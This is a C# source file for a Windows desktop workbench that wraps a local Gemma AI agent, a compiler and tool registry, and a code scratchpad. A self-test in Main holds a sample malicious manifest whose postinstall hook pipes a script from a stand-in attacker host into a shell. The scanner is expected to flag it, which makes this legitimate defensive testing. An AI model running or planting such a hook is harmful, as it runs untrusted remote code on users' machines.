using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace OmegaForgeStudio
{
    public sealed partial class OmegaForgeForm : Form, IForgeHostApi
    {
        [DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();

        private readonly string _forgeRoot, _workspaceDir, _profilePath;
        private List<ToolDescriptor> _tools = new List<ToolDescriptor>();
        private List<ToolDescriptor> _visibleTools = new List<ToolDescriptor>();
        private List<AiModelDescriptor> _models = new List<AiModelDescriptor>();
        private readonly List<ChatTurnMessage> _chatHistory = new List<ChatTurnMessage>();
        private ForgeLocalApiServer _apiServer;
        private volatile bool _agentBusy = false;
        private volatile bool _cancelAgent = false;
        private bool _suppressItemCheck = false;
        private string _lastAssistantReply = "";

        private Label _lblTopStats, _lblStreamHud, _lblToolDetail, _lblStatus;
        private ComboBox _cmbModel, _cmbContextMode, _cmbCategoryFilter, _cmbScratchLang;
        private NumericUpDown _nudMaxTokens, _nudTemp;
        private TextBox _txtEndpoint, _txtModelTag, _txtToolSearch, _txtAgentChat, _txtUserPrompt, _txtScratchCode, _txtExecLog;
        private CheckBox _chkAutoReAct, _chkAutoHarvestVerify, _chkDualBrain;
        private CheckedListBox _clbTools;
        private ListBox _lstDiskModels;
        private Button _btnSendGemma, _btnStopGemma;
        private ToolTip _tip;

        public OmegaForgeForm(string forgeRoot)
        {
            _forgeRoot = forgeRoot;
            _workspaceDir = Path.Combine(forgeRoot, "workspace");
            _profilePath = Path.Combine(forgeRoot, "forge_profile.tsv");
            Directory.CreateDirectory(_workspaceDir);

            Text = "ACT-Omega Lab :: OmegaForge v0.2.1 (09_omega_forge) — Modular Toolchain, Lean 4 / Rust Verifier & Dual-Brain Gemma Hub (:19780)";
            Size = new Size(1640, 940);
            MinimumSize = new Size(1260, 720);
            StartPosition = FormStartPosition.CenterScreen;
            BackColor = Color.FromArgb(8, 12, 21);
            ForeColor = Color.White;
            KeyPreview = true;
            _tip = new ToolTip();
            _tip.InitialDelay = 250;
            try
            {
                string ico = Path.Combine(Directory.GetParent(forgeRoot).FullName, "icons", "omega_forge.ico");
                if (File.Exists(ico)) Icon = new Icon(ico);
            }
            catch { }

            BuildWorkbenchUi();

            _apiServer = new ForgeLocalApiServer(19780, this);
            _apiServer.Start();

            Shown += async delegate { await RunFullSystemProbeAsync(); };
            FormClosing += delegate
            {
                LocalGemmaAgentEngine.AbortActiveRequest();
                SaveToolSelectionProfile();
                if (_apiServer != null) _apiServer.Stop();
            };
        }

        private void BuildWorkbenchUi()
        {
            // HUD-Safe 3-Row Top Deck: Row 1 keeps live stats on far-left & Help/Workspace on far-right (clearing top-center overlay HUDs!)
            Panel topDeck = new Panel();
            topDeck.Dock = DockStyle.Top;
            topDeck.Height = 114;
            topDeck.BackColor = Color.FromArgb(12, 19, 34);
            topDeck.Padding = new Padding(10, 4, 10, 4);

            Panel row1 = new Panel(); row1.Dock = DockStyle.Top; row1.Height = 32;
            FlowLayoutPanel r1Right = new FlowLayoutPanel(); r1Right.Dock = DockStyle.Right; r1Right.AutoSize = true; r1Right.WrapContents = false;

            Button bGuide = MakeBtn("? Forge v0.2 Guide", Color.FromArgb(180, 83, 9));
            bGuide.Click += delegate { ShowForgeQuickGuideDialog(); };

            Button bOpenWs = MakeBtn("Open Workspace", Color.FromArgb(15, 118, 110));
            bOpenWs.Click += delegate { Process.Start("explorer.exe", "\"" + _workspaceDir + "\""); };

            r1Right.Controls.AddRange(new Control[] { bGuide, bOpenWs });

            _lblTopStats = new Label();
            _lblTopStats.Dock = DockStyle.Fill;
            _lblTopStats.TextAlign = ContentAlignment.MiddleLeft;
            _lblTopStats.Font = new Font("Consolas", 9.0f, FontStyle.Bold);
            _lblTopStats.ForeColor = Color.FromArgb(56, 189, 248);
            _lblTopStats.Text = "OMEGAFORGE v0.2.1 (:19780) :: Probing compilers, SDKs, and local AI servers...";

            row1.Controls.Add(_lblTopStats);
            row1.Controls.Add(r1Right);

            // Row 2: Model selector, Endpoint, Tag, Boot/Ping, Wake Ollama, Re-Scan, Custom Tool
            FlowLayoutPanel row2 = new FlowLayoutPanel();
            row2.Dock = DockStyle.Top;
            row2.Height = 36;
            row2.WrapContents = false;
            row2.Padding = new Padding(0, 3, 0, 0);

            Label lMod = MakeLbl("AI Model:", Color.FromArgb(167, 139, 250));
            _cmbModel = new ComboBox(); _cmbModel.Width = 320; _cmbModel.DropDownStyle = ComboBoxStyle.DropDownList;
            _cmbModel.BackColor = Color.FromArgb(7, 11, 19); _cmbModel.ForeColor = Color.White; _cmbModel.Font = new Font("Consolas", 8.6f);
            _cmbModel.SelectedIndexChanged += delegate { OnSelectedModelChanged(); };

            Label lEp = MakeLbl("Endpoint:", Color.FromArgb(148, 163, 184));
            _txtEndpoint = new TextBox(); _txtEndpoint.Width = 235; _txtEndpoint.BackColor = Color.FromArgb(7, 11, 19); _txtEndpoint.ForeColor = Color.FromArgb(125, 211, 252);
            _txtEndpoint.Font = new Font("Consolas", 8.5f); _txtEndpoint.BorderStyle = BorderStyle.FixedSingle; _txtEndpoint.Text = "http://127.0.0.1:8097/v1/chat/completions";

            Label lTag = MakeLbl("Tag:", Color.FromArgb(148, 163, 184));
            _txtModelTag = new TextBox(); _txtModelTag.Width = 148; _txtModelTag.BackColor = Color.FromArgb(7, 11, 19); _txtModelTag.ForeColor = Color.White;
            _txtModelTag.Font = new Font("Consolas", 8.5f); _txtModelTag.BorderStyle = BorderStyle.FixedSingle; _txtModelTag.Text = "gemma-4-12B-it-sh4z";

            Button bBoot = MakeBtn("Boot / Ping", Color.FromArgb(5, 150, 105));
            bBoot.Click += delegate { BootOrPingSelectedModel(); };

            Button bWakeOllama = MakeBtn("Wake Ollama (:11434)", Color.FromArgb(109, 40, 217));
            bWakeOllama.Click += async delegate { await WakeOllamaAndRescanAsync(); };

            Button bRescan = MakeBtn("Re-Scan Laptop", Color.FromArgb(2, 132, 199));
            bRescan.Click += async delegate { await RunFullSystemProbeAsync(); };

            Button bAddCustom = MakeBtn("+ Custom Tool", Color.FromArgb(51, 65, 85));
            bAddCustom.Click += delegate { OpenRegisterCustomToolModal(); };

            row2.Controls.AddRange(new Control[] { lMod, _cmbModel, lEp, _txtEndpoint, lTag, _txtModelTag, bBoot, bWakeOllama, bRescan, bAddCustom });

            // Row 3: Surgical MoE Context Gate + MaxTok + Temp + Auto-Verify + Dual-Brain + ReAct
            FlowLayoutPanel row3 = new FlowLayoutPanel();
            row3.Dock = DockStyle.Bottom;
            row3.Height = 36;
            row3.WrapContents = false;
            row3.Padding = new Padding(0, 3, 0, 0);

            Label lCtx = MakeLbl("Context Gate:", Color.FromArgb(56, 189, 248));
            _cmbContextMode = new ComboBox(); _cmbContextMode.Width = 205; _cmbContextMode.DropDownStyle = ComboBoxStyle.DropDownList;
            _cmbContextMode.BackColor = Color.FromArgb(7, 11, 19); _cmbContextMode.ForeColor = Color.FromArgb(52, 211, 153); _cmbContextMode.Font = new Font("Consolas", 8.4f);
            _cmbContextMode.Items.AddRange(new object[] { "Surgical Intent (1-3 Tools)", "Raw Model (Zero System)", "Full Armed Matrix" });
            _cmbContextMode.SelectedIndex = 0;

            Label lMx = MakeLbl("MaxTok:", Color.FromArgb(148, 163, 184));
            _nudMaxTokens = new NumericUpDown(); _nudMaxTokens.Width = 68; _nudMaxTokens.Minimum = 128; _nudMaxTokens.Maximum = 8192; _nudMaxTokens.Increment = 256; _nudMaxTokens.Value = 1024;
            _nudMaxTokens.BackColor = Color.FromArgb(7, 11, 19); _nudMaxTokens.ForeColor = Color.White; _nudMaxTokens.Font = new Font("Consolas", 8.5f);

            Label lTmp = MakeLbl("Temp:", Color.FromArgb(148, 163, 184));
            _nudTemp = new NumericUpDown(); _nudTemp.Width = 58; _nudTemp.DecimalPlaces = 2; _nudTemp.Minimum = 0.00m; _nudTemp.Maximum = 1.50m; _nudTemp.Increment = 0.05m; _nudTemp.Value = 0.20m;
            _nudTemp.BackColor = Color.FromArgb(7, 11, 19); _nudTemp.ForeColor = Color.White; _nudTemp.Font = new Font("Consolas", 8.5f);

            _chkAutoHarvestVerify = MakeChk("Auto-Verify Fences & Lean 4", true, Color.FromArgb(52, 211, 153));
            _chkDualBrain = MakeChk("Dual-Brain Tandem (:11434 + :8097)", false, Color.FromArgb(250, 204, 21));
            _chkAutoReAct = MakeChk("ReAct Tool Loop", true, Color.FromArgb(125, 211, 252));

            row3.Controls.AddRange(new Control[] { lCtx, _cmbContextMode, lMx, _nudMaxTokens, lTmp, _nudTemp, _chkAutoHarvestVerify, _chkDualBrain, _chkAutoReAct });

            topDeck.Controls.Add(row3);
            topDeck.Controls.Add(row2);
            topDeck.Controls.Add(row1);

            // Bottom Status Bar
            Panel botBar = new Panel(); botBar.Dock = DockStyle.Bottom; botBar.Height = 25; botBar.BackColor = Color.FromArgb(6, 9, 16);
            _lblStatus = new Label(); _lblStatus.Dock = DockStyle.Fill; _lblStatus.TextAlign = ContentAlignment.MiddleLeft;
            _lblStatus.Padding = new Padding(10, 0, 0, 0); _lblStatus.Font = new Font("Consolas", 8.4f); _lblStatus.ForeColor = Color.FromArgb(52, 211, 153);
            _lblStatus.Text = "OmegaForge v0.2.1 :19780 ONLINE | Surgical Intent Mode keeps :8097 focused; Auto-Verify compiles Rust/C#/HLSL & Lean 4 proofs live.";
            botBar.Controls.Add(_lblStatus);

            // 3-Column Split Layout
            SplitContainer outerSplit = new SplitContainer();
            outerSplit.Dock = DockStyle.Fill;
            outerSplit.BackColor = Color.FromArgb(30, 41, 59);
            outerSplit.SplitterWidth = 5;

            SplitContainer rightSplit = new SplitContainer();
            rightSplit.Dock = DockStyle.Fill;
            rightSplit.BackColor = Color.FromArgb(30, 41, 59);
            rightSplit.SplitterWidth = 5;

            BuildLeftRegistryPane(outerSplit.Panel1);
            BuildCenterGemmaPane(rightSplit.Panel1);
            BuildRightScratchpadPane(rightSplit.Panel2);

            outerSplit.Panel2.Controls.Add(rightSplit);

            Controls.Add(outerSplit);
            Controls.Add(topDeck);
            Controls.Add(botBar);

            Shown += delegate
            {
                try
                {
                    outerSplit.SplitterDistance = 385;
                    rightSplit.SplitterDistance = Math.Max(490, (ClientSize.Width - 395) / 2);
                }
                catch { }
            };
        }

        private void BuildLeftRegistryPane(Control host)
        {
            host.BackColor = Color.FromArgb(10, 15, 27);
            Panel hdr = new Panel(); hdr.Dock = DockStyle.Top; hdr.Height = 92; hdr.Padding = new Padding(8, 5, 8, 4); hdr.BackColor = Color.FromArgb(14, 21, 38);

            Label lTitle = new Label(); lTitle.Text = "1. MODULAR TOOLCHAIN & COMPILER MATRIX"; lTitle.Dock = DockStyle.Top; lTitle.Height = 19;
            lTitle.Font = new Font("Segoe UI", 8.8f, FontStyle.Bold); lTitle.ForeColor = Color.FromArgb(56, 189, 248);

            FlowLayoutPanel presetRow = new FlowLayoutPanel(); presetRow.Dock = DockStyle.Top; presetRow.Height = 30; presetRow.WrapContents = false; presetRow.Padding = new Padding(0, 2, 0, 0);
            Button pAll = MakeBtn("All Found", Color.FromArgb(6, 95, 70)); pAll.Click += delegate { SetToolPreset("all"); };
            Button pGpu = MakeBtn("GPU/HLSL", Color.FromArgb(14, 116, 144)); pGpu.Click += delegate { SetToolPreset("gpu"); };
            Button pLean = MakeBtn("Lean 4", Color.FromArgb(109, 40, 217)); pLean.Click += delegate { SetToolPreset("lean"); };
            Button pSys = MakeBtn("Systems", Color.FromArgb(30, 58, 138)); pSys.Click += delegate { SetToolPreset("systems"); };
            Button pEdge = MakeBtn("ADB/SQL", Color.FromArgb(51, 65, 85)); pEdge.Click += delegate { SetToolPreset("edge"); };
            presetRow.Controls.AddRange(new Control[] { pAll, pGpu, pLean, pSys, pEdge });

            FlowLayoutPanel flt = new FlowLayoutPanel(); flt.Dock = DockStyle.Bottom; flt.Height = 30; flt.WrapContents = false;
            _cmbCategoryFilter = new ComboBox(); _cmbCategoryFilter.Width = 156; _cmbCategoryFilter.DropDownStyle = ComboBoxStyle.DropDownList;
            _cmbCategoryFilter.BackColor = Color.FromArgb(7, 11, 19); _cmbCategoryFilter.ForeColor = Color.White; _cmbCategoryFilter.Font = new Font("Segoe UI", 8.3f);
            _cmbCategoryFilter.Items.AddRange(new object[] { "All Categories", "Found Only", "Compilers", "GPU & Shaders", "Languages & Runtimes", "Proof & Algebra", "Edge & Systems", "AI Runners", "Lab Bridges" });
            _cmbCategoryFilter.SelectedIndex = 0;
            _cmbCategoryFilter.SelectedIndexChanged += delegate { RefreshToolChecklist(); };

            _txtToolSearch = new TextBox(); _txtToolSearch.Width = 185; _txtToolSearch.BackColor = Color.FromArgb(7, 11, 19); _txtToolSearch.ForeColor = Color.White;
            _txtToolSearch.BorderStyle = BorderStyle.FixedSingle; _txtToolSearch.Font = new Font("Consolas", 8.5f);
            _txtToolSearch.TextChanged += delegate { RefreshToolChecklist(); };
            flt.Controls.AddRange(new Control[] { _cmbCategoryFilter, _txtToolSearch });

            hdr.Controls.Add(flt);
            hdr.Controls.Add(presetRow);
            hdr.Controls.Add(lTitle);

            Panel botInfo = new Panel(); botInfo.Dock = DockStyle.Bottom; botInfo.Height = 215; botInfo.Padding = new Padding(8, 6, 8, 6); botInfo.BackColor = Color.FromArgb(12, 18, 32);

            _lblToolDetail = new Label(); _lblToolDetail.Dock = DockStyle.Top; _lblToolDetail.Height = 56;
            _lblToolDetail.Font = new Font("Consolas", 8.0f); _lblToolDetail.ForeColor = Color.FromArgb(203, 213, 225);
            _lblToolDetail.Text = "Single-click any tool above to inspect its binary path; click its checkbox to arm/disarm for AI.";

            Button bLoadSample = MakeBtn("Load Selected Tool Template -> Scratchpad", Color.FromArgb(3, 105, 161));
            bLoadSample.Dock = DockStyle.Top;
            bLoadSample.Click += delegate { LoadSelectedToolSampleIntoScratchpad(); };

            Label lModHdr = new Label(); lModHdr.Text = "DISCOVERED LOCAL AI WEIGHTS & SERVERS (Double-Click):"; lModHdr.Dock = DockStyle.Top; lModHdr.Height = 22;
            lModHdr.Padding = new Padding(0, 5, 0, 0); lModHdr.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold); lModHdr.ForeColor = Color.FromArgb(167, 139, 250);

            _lstDiskModels = new ListBox(); _lstDiskModels.Dock = DockStyle.Fill;
            _lstDiskModels.HorizontalScrollbar = true;
            _lstDiskModels.BackColor = Color.FromArgb(7, 11, 19); _lstDiskModels.ForeColor = Color.FromArgb(52, 211, 153);
            _lstDiskModels.Font = new Font("Consolas", 8.1f); _lstDiskModels.BorderStyle = BorderStyle.FixedSingle;
            _lstDiskModels.SelectedIndexChanged += delegate
            {
                if (_lstDiskModels.SelectedItem != null)
                    _tip.SetToolTip(_lstDiskModels, _lstDiskModels.SelectedItem.ToString());
            };
            _lstDiskModels.DoubleClick += delegate
            {
                if (_lstDiskModels.SelectedIndex >= 0 && _lstDiskModels.SelectedIndex < _cmbModel.Items.Count)
                    _cmbModel.SelectedIndex = _lstDiskModels.SelectedIndex;
            };

            botInfo.Controls.Add(_lstDiskModels);
            botInfo.Controls.Add(lModHdr);
            botInfo.Controls.Add(bLoadSample);
            botInfo.Controls.Add(_lblToolDetail);

            _clbTools = new CheckedListBox();
            _clbTools.Dock = DockStyle.Fill;
            _clbTools.CheckOnClick = false;
            _clbTools.HorizontalScrollbar = true;
            _clbTools.BackColor = Color.FromArgb(7, 11, 19);
            _clbTools.ForeColor = Color.FromArgb(226, 232, 240);
            _clbTools.Font = new Font("Consolas", 8.4f);
            _clbTools.BorderStyle = BorderStyle.None;
            _clbTools.SelectedIndexChanged += delegate
            {
                int idx = _clbTools.SelectedIndex;
                if (idx >= 0 && idx < _visibleTools.Count)
                {
                    ToolDescriptor td = _visibleTools[idx];
                    bool armed = td.Enabled && (td.Found || td.IsBuiltInVirtual);
                    string detail = "ID: " + td.Id + "  |  Installed: " + (td.Found || td.IsBuiltInVirtual) + "  |  Armed: " + armed + "\r\nPath: " + td.ExecutablePath + "\r\nVer:  " + td.VersionBanner;
                    _lblToolDetail.Text = detail;
                    _tip.SetToolTip(_clbTools, detail);
                }
            };
            _clbTools.ItemCheck += delegate(object sc, ItemCheckEventArgs ice)
            {
                if (_suppressItemCheck) return;
                if (ice.Index >= 0 && ice.Index < _visibleTools.Count)
                {
                    ToolDescriptor td = _visibleTools[ice.Index];
                    if (!td.Found && !td.IsBuiltInVirtual && ice.NewValue == CheckState.Checked)
                    {
                        ice.NewValue = CheckState.Unchecked;
                        td.Enabled = false;
                        _lblStatus.Text = "Cannot arm [" + td.Id + "] because '" + td.ExecutablePath + "' is not installed. Click [+ Custom Tool] if located elsewhere.";
                        return;
                    }
                    td.Enabled = (ice.NewValue == CheckState.Checked);
                    UpdateHeaderCounts();
                }
            };

            host.Controls.Add(_clbTools);
            host.Controls.Add(hdr);
            host.Controls.Add(botInfo);
        }

        private void BuildCenterGemmaPane(Control host)
        {
            host.BackColor = Color.FromArgb(9, 13, 22);
            Panel hdr = new Panel(); hdr.Dock = DockStyle.Top; hdr.Height = 84; hdr.Padding = new Padding(8, 5, 8, 4); hdr.BackColor = Color.FromArgb(14, 21, 38);

            Label lTitle = new Label(); lTitle.Text = "2. LOCAL GEMMA AI AGENT — SSE STREAMING & AUTO-PROOF/COMPILER LOOP"; lTitle.Dock = DockStyle.Top; lTitle.Height = 19;
            lTitle.Font = new Font("Segoe UI", 8.8f, FontStyle.Bold); lTitle.ForeColor = Color.FromArgb(192, 132, 252);

            _lblStreamHud = new Label(); _lblStreamHud.Dock = DockStyle.Top; _lblStreamHud.Height = 22;
            _lblStreamHud.Font = new Font("Consolas", 8.2f, FontStyle.Bold); _lblStreamHud.ForeColor = Color.FromArgb(250, 204, 21);
            _lblStreamHud.Text = "Stream: Ready  |  Speed: 0.0 tok/s  |  Tokens: 0  |  Unique 4-Gram: 100.0% (Zero-Loop)  |  Verified: 0";

            FlowLayoutPanel quickRow = new FlowLayoutPanel(); quickRow.Dock = DockStyle.Bottom; quickRow.Height = 30; quickRow.WrapContents = false;
            Button qGpu = MakeBtn("Ask: RTX GPU", Color.FromArgb(51, 65, 85));
            qGpu.Click += delegate { SendQuickPrompt("Use nvidia_smi to check my RTX GPU model, VRAM usage, and temperature, then summarize."); };

            Button qBench = MakeBtn("Ask: C# vs Rust E8", Color.FromArgb(51, 65, 85));
            qBench.Click += delegate { SendQuickPrompt("Write a 240-root E8 norm benchmark in Rust (rustc) in a fenced rust block so OmegaForge compiles and runs it."); };

            Button qLean = MakeBtn("Ask: Lean 4 Proof", Color.FromArgb(67, 56, 202));
            qLean.Click += delegate { SendQuickPrompt("Write 3 formal Lean 4 theorems proving 7777D CRT coprime bounds and Reidemeister writhe cancellation with zero sorry."); };

            Button qHarvest = MakeBtn("Harvest & Verify Reply", Color.FromArgb(5, 150, 105));
            qHarvest.Click += async delegate { await HarvestAndVerifyTextAsync(_lastAssistantReply, true); };

            Button qClear = MakeBtn("Clear", Color.FromArgb(71, 85, 105));
            qClear.Click += delegate { _chatHistory.Clear(); _lastAssistantReply = ""; _txtAgentChat.Clear(); AppendChatBanner(); };

            quickRow.Controls.AddRange(new Control[] { qGpu, qBench, qLean, qHarvest, qClear });
            hdr.Controls.Add(quickRow);
            hdr.Controls.Add(_lblStreamHud);
            hdr.Controls.Add(lTitle);

            Panel promptPanel = new Panel(); promptPanel.Dock = DockStyle.Bottom; promptPanel.Height = 96; promptPanel.Padding = new Padding(8, 6, 8, 8); promptPanel.BackColor = Color.FromArgb(12, 18, 32);

            Panel btnCol = new Panel(); btnCol.Dock = DockStyle.Right; btnCol.Width = 132; btnCol.Padding = new Padding(6, 0, 0, 0);
            _btnSendGemma = MakeBtn("Send (Ctrl+Enter)", Color.FromArgb(109, 40, 217)); _btnSendGemma.Dock = DockStyle.Top; _btnSendGemma.Height = 46;
            _btnSendGemma.Click += async delegate { await RunGemmaTurnAsync(); };

            _btnStopGemma = MakeBtn("Stop Stream", Color.FromArgb(185, 28, 28)); _btnStopGemma.Dock = DockStyle.Bottom; _btnStopGemma.Height = 32; _btnStopGemma.Enabled = false;
            _btnStopGemma.Click += delegate
            {
                _cancelAgent = true;
                LocalGemmaAgentEngine.AbortActiveRequest();
                _lblStatus.Text = "Aborted active stream cleanly.";
            };
            btnCol.Controls.Add(_btnSendGemma); btnCol.Controls.Add(_btnStopGemma);

            _txtUserPrompt = new TextBox(); _txtUserPrompt.Dock = DockStyle.Fill; _txtUserPrompt.Multiline = true; _txtUserPrompt.ScrollBars = ScrollBars.Vertical;
            _txtUserPrompt.BackColor = Color.FromArgb(7, 11, 19); _txtUserPrompt.ForeColor = Color.White; _txtUserPrompt.Font = new Font("Consolas", 9.2f);
            _txtUserPrompt.BorderStyle = BorderStyle.FixedSingle;
            _txtUserPrompt.KeyDown += async delegate(object sp, KeyEventArgs kep)
            {
                if (kep.Control && kep.KeyCode == Keys.Enter) { kep.SuppressKeyPress = true; await RunGemmaTurnAsync(); }
            };

            promptPanel.Controls.Add(_txtUserPrompt);
            promptPanel.Controls.Add(btnCol);

            _txtAgentChat = new TextBox(); _txtAgentChat.Dock = DockStyle.Fill; _txtAgentChat.Multiline = true; _txtAgentChat.ReadOnly = true;
            _txtAgentChat.ScrollBars = ScrollBars.Vertical; _txtAgentChat.BackColor = Color.FromArgb(6, 9, 17);
            _txtAgentChat.ForeColor = Color.FromArgb(226, 232, 240); _txtAgentChat.Font = new Font("Consolas", 9.0f); _txtAgentChat.BorderStyle = BorderStyle.None;
            AppendChatBanner();

            host.Controls.Add(_txtAgentChat);
            host.Controls.Add(hdr);
            host.Controls.Add(promptPanel);
        }

        private void BuildRightScratchpadPane(Control host)
        {
            host.BackColor = Color.FromArgb(9, 13, 22);
            Panel hdr = new Panel(); hdr.Dock = DockStyle.Top; hdr.Height = 64; hdr.Padding = new Padding(8, 6, 8, 4); hdr.BackColor = Color.FromArgb(14, 21, 38);

            Label lTitle = new Label(); lTitle.Text = "3. DIRECT POLYGLOT COMPILER SCRATCHPAD & VERIFICATION RECEIPTS"; lTitle.Dock = DockStyle.Top; lTitle.Height = 20;
            lTitle.Font = new Font("Segoe UI", 8.8f, FontStyle.Bold); lTitle.ForeColor = Color.FromArgb(52, 211, 153);

            FlowLayoutPanel runBar = new FlowLayoutPanel(); runBar.Dock = DockStyle.Bottom; runBar.Height = 30; runBar.WrapContents = false;
            _cmbScratchLang = new ComboBox(); _cmbScratchLang.Width = 136; _cmbScratchLang.DropDownStyle = ComboBoxStyle.DropDownList;
            _cmbScratchLang.BackColor = Color.FromArgb(7, 11, 19); _cmbScratchLang.ForeColor = Color.White; _cmbScratchLang.Font = new Font("Consolas", 8.6f);
            _cmbScratchLang.Items.AddRange(new object[] { "csharp", "rust", "cpp", "msvc", "hlsl", "dxc", "lean4", "python", "deno", "node", "powershell", "nvidia_smi", "adb", "duckdb" });
            _cmbScratchLang.SelectedIndex = 0;
            _cmbScratchLang.SelectedIndexChanged += delegate { PopulateDefaultScratchForLang(); };

            Button bRunNow = MakeBtn("Compile & Run (F5)", Color.FromArgb(5, 150, 105));
            bRunNow.Click += async delegate { await RunDirectScratchpadAsync(); };

            Button bPullReply = MakeBtn("Pull Last AI Code", Color.FromArgb(3, 105, 161));
            bPullReply.Click += delegate { PullLastHarvestedBlockToScratchpad(); };

            Button bSendErr = MakeBtn("Ask Gemma Fix", Color.FromArgb(109, 40, 217));
            bSendErr.Click += async delegate
            {
                _txtUserPrompt.Text = "Fix any compiler issues and optimize this " + _cmbScratchLang.Text + " code:\r\n\r\n" + _txtScratchCode.Text + "\r\n\r\nCompiler log:\r\n" + _txtExecLog.Text;
                await RunGemmaTurnAsync();
            };

            Button bSealSec = MakeBtn("Seal -> OmegaSec", Color.FromArgb(5, 150, 105));
            bSealSec.Click += delegate { SealScratchpadViaOmegaSec(); };
            runBar.Controls.AddRange(new Control[] { _cmbScratchLang, bRunNow, bPullReply, bSendErr, bSealSec });
            hdr.Controls.Add(runBar); hdr.Controls.Add(lTitle);

            SplitContainer vSplit = new SplitContainer();
            vSplit.Dock = DockStyle.Fill;
            vSplit.Orientation = Orientation.Horizontal;
            vSplit.BackColor = Color.FromArgb(30, 41, 59);
            vSplit.SplitterWidth = 5;

            _txtScratchCode = new TextBox(); _txtScratchCode.Dock = DockStyle.Fill; _txtScratchCode.Multiline = true; _txtScratchCode.AcceptsTab = true;
            _txtScratchCode.ScrollBars = ScrollBars.Both; _txtScratchCode.WordWrap = false;
            _txtScratchCode.BackColor = Color.FromArgb(7, 11, 19); _txtScratchCode.ForeColor = Color.FromArgb(226, 232, 240);
            _txtScratchCode.Font = new Font("Consolas", 9.2f); _txtScratchCode.BorderStyle = BorderStyle.None;
            _txtScratchCode.KeyDown += async delegate(object scd, KeyEventArgs kec)
            {
                if (kec.KeyCode == Keys.F5) { kec.SuppressKeyPress = true; await RunDirectScratchpadAsync(); }
            };

            _txtExecLog = new TextBox(); _txtExecLog.Dock = DockStyle.Fill; _txtExecLog.Multiline = true; _txtExecLog.ReadOnly = true;
            _txtExecLog.ScrollBars = ScrollBars.Vertical; _txtExecLog.BackColor = Color.FromArgb(5, 8, 15);
            _txtExecLog.ForeColor = Color.FromArgb(125, 211, 252); _txtExecLog.Font = new Font("Consolas", 8.8f); _txtExecLog.BorderStyle = BorderStyle.None;

            vSplit.Panel1.Controls.Add(_txtScratchCode);
            vSplit.Panel2.Controls.Add(_txtExecLog);

            host.Controls.Add(vSplit);
            host.Controls.Add(hdr);

            Shown += delegate { try { vSplit.SplitterDistance = 390; } catch { } };
        }

        private void AppendChatBanner()
        {
            _txtAgentChat.AppendText("=== OMEGAFORGE v0.2.1 :: SURGICAL MOE + LIVE STREAMING + LEAN 4 / POLYGLOT AUTO-VERIFIER ===\r\n" +
                "1. Surgical Intent Mode injects ONLY the 1-3 tools relevant to your prompt so :8097 never gets polluted by unrelated tool names.\r\n" +
                "2. Live SSE Streaming displays real-time tok/s + Unique 4-Gram Non-Repetition %, and [Stop Stream] halts generation instantly.\r\n" +
                "3. Auto-Verify Fences & Lean 4 automatically harvests Rust/C#/C++/HLSL/DXC fences AND continuous :8097 Lean 4 proof streams and compiles them live!\r\n\r\n");
        }

        private static Label MakeLbl(string text, Color fg)
        {
            Label l = new Label();
            l.Text = text;
            l.AutoSize = true;
            l.Padding = new Padding(4, 6, 2, 0);
            l.ForeColor = fg;
            l.Font = new Font("Segoe UI Semibold", 8.3f);
            return l;
        }

        private static CheckBox MakeChk(string text, bool isChecked, Color fg)
        {
            CheckBox c = new CheckBox();
            c.Text = text;
            c.AutoSize = true;
            c.Checked = isChecked;
            c.ForeColor = fg;
            c.Font = new Font("Segoe UI Semibold", 8.2f);
            c.Padding = new Padding(8, 4, 0, 0);
            return c;
        }

        private static Button MakeBtn(string text, Color bg)
        {
            Button b = new Button();
            b.Text = text;
            b.AutoSize = true;
            b.AutoSizeMode = AutoSizeMode.GrowAndShrink;
            b.MinimumSize = new Size(28, 26);
            b.Padding = new Padding(5, 2, 5, 2);
            b.Margin = new Padding(0, 0, 4, 0);
            b.FlatStyle = FlatStyle.Flat;
            b.BackColor = bg;
            b.ForeColor = Color.White;
            b.Font = new Font("Segoe UI Semibold", 8.2f);
            b.FlatAppearance.BorderColor = Color.FromArgb(56, 189, 248);
            return b;
        }

        [STAThread]
        public static void Main(string[] args)
        {
            OmegaPortableConfig.OmegaHardwareConfig.LoadAndApplyEnvironment(false);
            if (args != null && args.Length > 0 && string.Equals(args[0], "--stress-test", StringComparison.OrdinalIgnoreCase))
            {
                string sampleManifest = "{\n  \"postinstall\": \"curl http://evil.example/payload.sh | /bin/sh\",\n  \"reqeusts\": \"*\"\n}";
                OmegaZeroCrateVault.SupplyChainScanReport sc = OmegaZeroCrateVault.OmegaVaultCore.ScanManifestForSupplyChainRisks(sampleManifest);
                bool ok = !sc.Clean && sc.Findings.Count >= 2;
                Console.WriteLine("[OMEGAFORGE SUPPLY-CHAIN FIREWALL] " + (ok ? "PASS" : "FAIL") + " -> Blocked " + sc.Findings.Count + " malicious hook/wildcard risks.");
                Environment.Exit(ok ? 0 : 1);
                return;
            }
            try { SetProcessDPIAware(); } catch { }
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            string root = AppDomain.CurrentDomain.BaseDirectory.TrimEnd('\\');
            Application.Run(new OmegaForgeForm(root));
        }
    }
}
